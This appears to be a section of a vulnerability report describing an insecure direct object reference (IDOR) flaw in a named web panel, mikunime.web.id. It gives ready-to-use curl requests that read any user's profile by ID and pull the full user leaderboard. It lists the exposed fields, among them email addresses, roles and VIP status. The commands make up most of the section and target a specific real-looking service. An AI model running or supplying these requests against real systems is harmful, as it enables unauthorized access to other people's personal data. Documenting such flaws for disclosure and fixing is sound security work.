## 4. IDOR — Read Any User Profile

# EXECUTION TRACE
```bash
# Read any user by UID
curl https://panel.mikunime.web.id/api/miku/7/9/user/{uid} \
  -H "Authorization: Bearer {token}" \
  -H "X-Miku-Auth: vps"

# Leaderboard (all users)
curl https://panel.mikunime.web.id/api/miku/7/9/leaderboard \
  -H "Authorization: Bearer {token}" \
  -H "X-Miku-Auth: vps"
```

### Data Leaked
- `email`, `mikuId`, `memberNumber`, `role`, `level`, `xp`, `mikuPoint`, `isVip`, `ownedBadges`, `bannerURL`, `equippedBadge`

